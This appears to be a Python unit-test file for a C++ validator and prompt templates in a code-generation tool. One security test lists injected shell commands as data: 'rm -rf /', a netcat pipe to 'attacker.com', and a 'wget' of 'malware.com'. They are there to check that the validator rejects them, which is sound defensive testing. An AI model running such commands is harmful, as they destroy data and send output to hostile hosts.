"""Tests for C++ language support."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from core.cpp_validator import CppValidator, validate_cpp
from tests.test_helpers import TempDirMixin


class TestCppValidator(TempDirMixin, unittest.TestCase):
    """Test C++ validation functionality."""

    def setUp(self) -> None:
        """Set up test environment."""
        super().setUp()
        self.validator = CppValidator(timeout_seconds=10)

    def test_simple_function_compilation(self) -> None:
        """Test compilation of simple C++ function."""
        code = """#include <iostream>
#include <vector>
#include <algorithm>

std::vector<int> sortNumbers(std::vector<int> numbers) {
    std::sort(numbers.begin(), numbers.end());
    return numbers;
}
"""

        tests = """#include <iostream>
#include <vector>
#include <cassert>

std::vector<int> sortNumbers(std::vector<int> numbers);

int main() {
    std::vector<int> input = {3, 1, 4, 1, 5};
    std::vector<int> result = sortNumbers(input);
    
    std::vector<int> expected = {1, 1, 3, 4, 5};
    assert(result == expected);
    
    std::cout << "All tests passed!" << std::endl;
    return 0;
}
"""

        result = self.validator.validate(code, tests)

        # Check if compiler is available
        if "not found" in result.get("notes", ""):
            self.skipTest("C++ compiler not available")
            return

        # Should either pass or fail with compilation details
        self.assertIn("status", result)
        self.assertIn("stdout", result)
        self.assertIn("stderr", result)
        self.assertIn("notes", result)

    def test_class_implementation(self) -> None:
        """Test C++ class implementation."""
        code = """#include <string>
#include <vector>

class Calculator {
private:
    double result;
    
public:
    Calculator() : result(0.0) {}
    
    double add(double value) {
        result += value;
        return result;
    }
    
    double getResult() const {
        return result;
    }
};
"""

        tests = """#include <iostream>
#include <cassert>

class Calculator {
private:
    double result;
    
public:
    Calculator() : result(0.0) {}
    
    double add(double value) {
        result += value;
        return result;
    }
    
    double getResult() const {
        return result;
    }
};

int main() {
    Calculator calc;
    calc.add(5.0);
    calc.add(3.0);
    
    assert(calc.getResult() == 8.0);
    
    std::cout << "Calculator tests passed!" << std::endl;
    return 0;
}
"""

        result = self.validator.validate(code, tests)

        if "not found" in result.get("notes", ""):
            self.skipTest("C++ compiler not available")
            return

        self.assertIn("status", result)

    def test_stl_usage(self) -> None:
        """Test STL container usage."""
        code = """#include <iostream>
#include <vector>
#include <map>
#include <string>

void processItems() {
    std::vector<int> numbers = {1, 2, 3, 4, 5};
    std::map<std::string, int> scores;
    
    scores["alice"] = 95;
    scores["bob"] = 87;
    
    for (const auto& pair : scores) {
        std::cout << pair.first << ": " << pair.second << std::endl;
    }
}
"""

        tests = """#include <iostream>
#include <cassert>

void processItems();

int main() {
    // Just test compilation
    std::cout << "STL test compiled successfully!" << std::endl;
    return 0;
}
"""

        result = self.validator.validate(code, tests)

        if "not found" in result.get("notes", ""):
            self.skipTest("C++ compiler not available")
            return

        self.assertIn("status", result)

    def test_compilation_error_handling(self) -> None:
        """Test handling of compilation errors."""
        code = """#include <iostream>

// This has a syntax error
void broken_function( {
    std::cout << "This won't compile" << std::endl;
}
"""

        tests = """#include <iostream>

int main() {
    std::cout << "Test" << std::endl;
    return 0;
}
"""

        result = self.validator.validate(code, tests)

        if "not found" in result.get("notes", ""):
            self.skipTest("C++ compiler not available")
            return

        # Should fail compilation
        self.assertEqual(result["status"], "failed")
        self.assertIn("compilation failed", result["notes"].lower())

    def test_missing_compiler_handling(self) -> None:
        """Test handling when no C++ compiler is available."""
        # Mock the validator to simulate missing compiler
        validator = CppValidator()

        # Temporarily override the compiler finding method
        original_find = validator._find_cpp_compiler
        validator._find_cpp_compiler = lambda: None

        try:
            result = validator.validate(
                "int main() { return 0; }",
                "int main() { return 0; }"
            )

            self.assertEqual(result["status"], "failed")
            self.assertIn("not found", result["notes"])
        finally:
            # Restore original method
            validator._find_cpp_compiler = original_find

    def test_convenience_function(self) -> None:
        """Test the convenience validate_cpp function."""
        code = """#include <iostream>

int main() {
    std::cout << "Hello, C++!" << std::endl;
    return 0;
}
"""

        tests = """#include <iostream>

int main() {
    std::cout << "Test passed!" << std::endl;
    return 0;
}
"""

        result = validate_cpp(code, tests, timeout_seconds=5)

        if "not found" in result.get("notes", ""):
            self.skipTest("C++ compiler not available")
            return

        self.assertIn("status", result)
        self.assertIn("stdout", result)
        self.assertIn("stderr", result)
        self.assertIn("notes", result)

    def test_timeout_handling(self) -> None:
        """Test timeout handling in C++ validation."""
        # Create an infinite loop
        code = """#include <iostream>

int main() {
    while (true) {
        // Infinite loop
    }
    return 0;
}
"""

        tests = """#include <iostream>

int main() {
    std::cout << "Test" << std::endl;
    return 0;
}
"""

        # Use very short timeout
        validator = CppValidator(timeout_seconds=1)
        result = validator.validate(code, tests)

        if "not found" in result.get("notes", ""):
            self.skipTest("C++ compiler not available")
            return

        # Should handle timeout gracefully
        self.assertIn("status", result)


class TestCppPrompts(unittest.TestCase):
    """Test C++ prompt generation."""

    def test_cpp_classification_prompt(self) -> None:
        """Test C++ classification prompt generation."""
        from templates.cpp_prompts import build_cpp_classification_user_prompt

        problem = "Create a function that sorts a vector of integers"
        context = "Working on algorithm implementation"

        prompt = build_cpp_classification_user_prompt(problem, context)

        self.assertIn("Problem:", prompt)
        self.assertIn("Context:", prompt)
        self.assertIn("C++ development", prompt)
        self.assertIn("Classify this programming problem", prompt)

    def test_cpp_reasoning_prompt(self) -> None:
        """Test C++ reasoning prompt generation."""
        from templates.cpp_prompts import build_cpp_reasoning_user_prompt

        problem = "Implement a binary search tree"
        classification = "algorithm"
        complexity = 7
        context = "Data structures implementation"

        prompt = build_cpp_reasoning_user_prompt(
            problem, classification, complexity, context)

        self.assertIn("Problem:", prompt)
        self.assertIn("Classification:", prompt)
        self.assertIn("Complexity:", prompt)
        self.assertIn("Language: C++", prompt)
        self.assertIn("C++-specific aspects", prompt)

    def test_cpp_coding_prompt(self) -> None:
        """Test C++ coding prompt generation."""
        from templates.cpp_prompts import build_cpp_coding_user_prompt

        problem = "Create a calculator class"
        classification = "feature"
        complexity = 5
        understanding = "Need a class with basic arithmetic operations"
        plan = ["Design class interface", "Implement methods", "Add tests"]
        language = "cpp"

        prompt = build_cpp_coding_user_prompt(
            problem, classification, complexity, understanding, plan, language)

        self.assertIn("Problem:", prompt)
        self.assertIn("Language: C++", prompt)
        self.assertIn("Modern C++ (C++17 or later)", prompt)
        self.assertIn("RAII principles", prompt)
        self.assertIn("STL containers", prompt)

    def test_cpp_repair_prompt(self) -> None:
        """Test C++ repair prompt generation."""
        from templates.cpp_prompts import build_cpp_repair_user_prompt

        original_code = "void broken_function( {"
        original_tests = "int main() { return 0; }"
        error_message = "syntax error"
        problem = "Fix compilation error"

        prompt = build_cpp_repair_user_prompt(
            original_code, original_tests, error_message, problem)

        self.assertIn("Original Code:", prompt)
        self.assertIn("Original Tests:", prompt)
        self.assertIn("Error Message:", prompt)
        self.assertIn("Common C++ issues", prompt)

    def test_cpp_template_examples(self) -> None:
        """Test C++ template examples."""
        from templates.cpp_prompts import get_cpp_template_examples

        examples = get_cpp_template_examples()

        self.assertIn("simple_function", examples)
        self.assertIn("class_implementation", examples)
        self.assertIn("stl_usage", examples)
        self.assertIn("smart_pointers", examples)

        # Check that examples contain valid C++ code
        self.assertIn("#include", examples["simple_function"])
        self.assertIn("class", examples["class_implementation"])
        self.assertIn("std::vector", examples["stl_usage"])
        self.assertIn("std::make_unique", examples["smart_pointers"])

    def test_cpp_build_instructions(self) -> None:
        """Test C++ build instructions."""
        from templates.cpp_prompts import get_cpp_build_instructions

        instructions = get_cpp_build_instructions()

        self.assertIn("C++ Build Instructions", instructions)
        self.assertIn("g++", instructions)
        self.assertIn("-std=c++17", instructions)
        self.assertIn("Compilation Commands", instructions)

    def test_cpp_validator_complete_fields(self) -> None:
        """Test that C++ validator returns all required fields."""
        validator = CppValidator()

        # Mock missing compiler to test error structure
        original_find = validator._find_cpp_compiler
        validator._find_cpp_compiler = lambda: None

        try:
            result = validator.validate(
                "int main() { return 0; }",
                "int main() { return 0; }"
            )

            # Check all required fields are present
            required_fields = [
                "status", "tool", "command", "stdout", "stderr",
                "timed_out", "returncode", "duration_seconds", "notes"
            ]

            for field in required_fields:
                self.assertIn(field, result, f"Missing field: {field}")

            # Check specific values for missing compiler case
            self.assertEqual(result["status"], "failed")
            self.assertEqual(result["tool"], "cpp-compiler")
            self.assertIsNone(result["command"])
            self.assertEqual(result["timed_out"], False)
            self.assertEqual(result["returncode"], -1)
            self.assertEqual(result["duration_seconds"], 0)
            self.assertIn("not found", result["notes"])

        finally:
            validator._find_cpp_compiler = original_find

    def test_cpp_validator_security(self) -> None:
        """Test C++ validator security features."""
        validator = CppValidator()

        # Test command validation
        safe_commands = [
            ["g++", "test.cpp", "-o", "test"],
            ["clang++", "test.cpp", "-std=c++17"],
            ["cpp", "test.cpp"]
        ]

        for cmd in safe_commands:
            self.assertTrue(validator._validate_command_security(cmd),
                            f"Safe command should pass: {cmd}")

        # Test dangerous commands
        dangerous_commands = [
            ["g++", "test.cpp", ";", "rm", "-rf", "/"],
            ["clang++", "test.cpp", "|", "nc", "attacker.com", "4444"],
            ["cpp", "test.cpp", "&&", "wget", "malware.com"]
        ]

        for cmd in dangerous_commands:
            self.assertFalse(validator._validate_command_security(cmd),
                             f"Dangerous command should fail: {cmd}")

    def test_cpp_validator_cache(self) -> None:
        """Test C++ compiler caching."""
        validator = CppValidator()

        # First call should set cache
        compiler1 = validator._find_cpp_compiler()

        # Second call should use cache (same result)
        compiler2 = validator._find_cpp_compiler()

        self.assertEqual(compiler1, compiler2)

        # Cache should be stored
        self.assertIsNotNone(validator._compiler_cache)
        self.assertEqual(validator._compiler_cache, compiler1)
